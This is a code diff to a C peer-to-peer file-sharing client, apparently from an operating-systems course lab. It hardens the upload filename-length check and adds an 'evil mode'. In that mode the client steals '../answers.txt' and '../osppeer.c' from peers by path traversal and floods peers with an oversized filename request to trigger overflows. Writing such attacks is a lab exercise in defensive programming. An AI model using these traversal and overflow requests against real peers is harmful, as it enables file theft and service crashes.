@@ -29,6 +29,7 @@ int evil_mode;			// nonzero iff this peer should behave badly
 
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
+const char *myalias;
 
 
 /*****************************************************************************
@@ -536,8 +537,11 @@ task_t *who(task_t *tracker_task)
 	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
 		if (!(p = parse_peer(s1, s2 - s1)))
 			die("osptracker responded to WHO command with unexpected format!\n");
-		p->next = t->peer_list;
-		t->peer_list = p;
+		char p_addr[FILENAMESIZ], l_addr[FILENAMESIZ];
+		if (strcmp(p->alias, myalias) != 0) { // exclude self from WHO list
+			p->next = t->peer_list;
+			t->peer_list = p;
+		}
 		s1 = s2 + 1;
 	}
 	if (s1 != tracker_task->buf + messagepos)
@@ -570,7 +574,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		goto try_again;
 
 	// Connect to the peer and write the GET command
-	message("* Connecting to %s:%d to download '%s'\n",
+	message("* Connecting to %s %s:%d to download '%s'\n", t->peer_list->alias,
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
@@ -735,8 +739,10 @@ static void task_upload(task_t *t)
 
 	assert(t->head == 0);
 	// Buffer overflow protection on filename
-	if (t->tail > (4 + FILENAMESIZ + 7))
-		error("* filename is too long!\n");
+	if (t->tail > (4 + FILENAMESIZ + 7)) {
+		error("* Filename is too long!\n");
+		goto exit;
+	}
 	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
 		goto exit;
@@ -837,6 +843,7 @@ static void upload_files (task_t *listen_task) {
 static void steal_file(task_t *tracker_task, const char *filename) {
 	task_t *t;
 	if ((t = who(tracker_task))) {
+		message("* Who returned\n");
 		int child = fork();
 		if (child == 0) {
 			strcpy(t->filename, filename);
@@ -849,6 +856,26 @@ static void steal_file(task_t *tracker_task, const char *filename) {
 	return;
 }
 
+static void overload_request(task_t *tracker_task) {
+	task_t *t;
+	t = who(tracker_task);
+	
+	message("* Beginning file length overload request\n");
+	while (t && t->peer_list) {
+		// Connect to the peer and write the GET command
+		message("* Connecting to %s %s:%d to request a long file\n", t->peer_list->alias,
+				inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+		} else {
+			osp2p_writef(t->peer_fd, "GET pewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpew OSP2P\n", t->filename);
+		}
+		task_pop_peer(t);
+	}
+	return;
+}
+
 // main(argc, argv)
 //	The main loop!
 int main(int argc, char *argv[])
@@ -857,7 +884,6 @@ int main(int argc, char *argv[])
 	struct in_addr tracker_addr;
 	int tracker_port;
 	char *s;
-	const char *myalias;
 	struct passwd *pwent;
 	pid_t child;
 
@@ -927,12 +953,6 @@ int main(int argc, char *argv[])
 	tracker_task = start_tracker(tracker_addr, tracker_port);
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
-
-	// Thievery: steal other users' answers file
-	if (evil_mode) {
-		steal_file(tracker_task, "../answers.txt");
-		steal_file(tracker_task, "../osppeer.c");
-	}
 	
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++) {
@@ -949,8 +969,17 @@ int main(int argc, char *argv[])
 		}
 	}
 	
+	if (evil_mode) {
+		message("* Evil mode\n");
+		// Thievery: steal other users' answers file
+		steal_file(tracker_task, "../answers.txt");
+		steal_file(tracker_task, "../osppeer.c");
+		
+		// Send an oversized filename request from all peers
+		overload_request(tracker_task);
+	}
+	
 	// Parent serves upload requests
 	upload_files (listen_task);
-	
 	return 0;
 }
